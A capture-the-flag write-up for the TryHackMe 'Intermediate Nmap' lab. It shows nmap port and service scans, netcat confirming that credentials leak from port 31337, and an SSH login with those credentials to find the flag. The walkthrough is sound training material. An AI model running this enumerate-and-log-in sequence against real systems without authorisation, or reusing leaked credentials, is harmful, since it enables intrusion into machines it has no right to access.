# TryHackMe — Intermediate Nmap

**Difficulty:** Easy
**Category:** Network Enumeration / Nmap / SSH
**Platform:** TryHackMe

## Overview

The **Intermediate Nmap** room focuses on using Nmap beyond a basic port scan.

The objective is to enumerate the target, identify an unusual service running on a high-numbered port, extract useful information from that service, and use the discovered credentials to gain SSH access to the machine.

---

## Target Information

```text
Target IP: 10.10.148.214
```

The target is a Linux machine exposing several TCP services.

---

# 1. Full Port Scan

I started with a full TCP port scan to identify all accessible services:

```bash
sudo nmap -p- --min-rate 10000 10.10.148.214
```

The scan identified three open ports:

```text
22/tcp      open    ssh
2222/tcp    open    ssh
31337/tcp   open    unknown
```

The interesting port here is **31337**, since it is a high-numbered port and doesn't immediately correspond to a standard service.

---

# 2. Service Enumeration

Next, I used Nmap's default scripts and version detection:

```bash
sudo nmap -sC -sV -T4 -p 22,2222,31337 10.10.148.214
```

The results showed:

```text
22/tcp    open  ssh
2222/tcp  open  ssh
31337/tcp open  Elite?
```

The SSH services were running OpenSSH on Ubuntu.

More importantly, Nmap's service fingerprinting returned unexpected information from port **31337**:

```text
In case I forget - user:pass
ubuntu:Dafdas!!/str0ng
```

This immediately looked like a username and password.

---

# 3. Investigating Port 31337

Rather than relying solely on Nmap's fingerprinting, I manually connected to the service using Netcat:

```bash
nc -nv 10.10.148.214 31337
```

The service returned:

```text
In case I forget - user:pass
ubuntu:Dafdas!!/str0ng
```

This confirmed that the credentials were actually being exposed by the service.

The discovered credentials were:

```text
Username: ubuntu
Password: Dafdas!!/str0ng
```

---

# 4. SSH Access

Since port 22 was running SSH, I attempted to authenticate using the discovered credentials:

```bash
ssh ubuntu@10.10.148.214
```

After accepting the SSH host key, I entered the discovered password:

```text
Dafdas!!/str0ng
```

Authentication succeeded.

I verified the account and hostname:

```bash
whoami && hostname
```

Output:

```text
ubuntu
f518fa10296d
```

This confirmed that I had successfully obtained shell access as the `ubuntu` user.

---

# 5. Finding the Flag

With SSH access established, I searched the machine for the room's flag.

A simple approach was:

```bash
find / -type f -name "flag*" 2>/dev/null
```

The flag can then be read with:

```bash
cat /path/to/flag
```

---

# Attack Path

The complete attack chain was:

```text
Full Port Scan
      |
      v
Identify 31337/tcp
      |
      v
Service Enumeration (-sC -sV)
      |
      v
Credentials exposed by service
      |
      v
ubuntu:Dafdas!!/str0ng
      |
      v
SSH on port 22
      |
      v
Authenticated shell
      |
      v
Flag
```

---

# Key Takeaways

### 1. Always perform full port enumeration

A default Nmap scan only checks the most common ports.

Using:

```bash
nmap -p-
```

allows unusual services on high-numbered ports to be discovered.

### 2. Version detection provides additional context

Combining:

```bash
-sC -sV
```

can reveal information that isn't obvious from a basic port scan.

### 3. Don't ignore unusual services

Port `31337` wasn't immediately identifiable as a conventional service.

When encountering an unusual port, manually interact with it using tools such as:

```bash
nc
telnet
curl
```

depending on what the service appears to be.

### 4. Validate interesting Nmap output

Nmap's service detection identified credentials during fingerprinting.

Instead of immediately assuming the output was valid, I confirmed it manually with:

```bash
nc -nv 10.10.148.214 31337
```

### 5. Enumeration can lead directly to authentication

The important lesson from this room is that enumeration isn't just about finding ports.

The goal is to understand **what those services expose** and how that information can be used to move forward.

---

## Tools Used

* Nmap
* Netcat
* SSH
* Linux command line

## Conclusion

Intermediate Nmap is a short but useful exercise in combining multiple enumeration techniques.

The key lesson is:

> **Scan broadly, investigate unusual services, validate what you discover, and think about how the information connects to the next step.**

In this case, a credential leak on an unusual high-numbered port provided everything necessary to authenticate through SSH and obtain the flag.
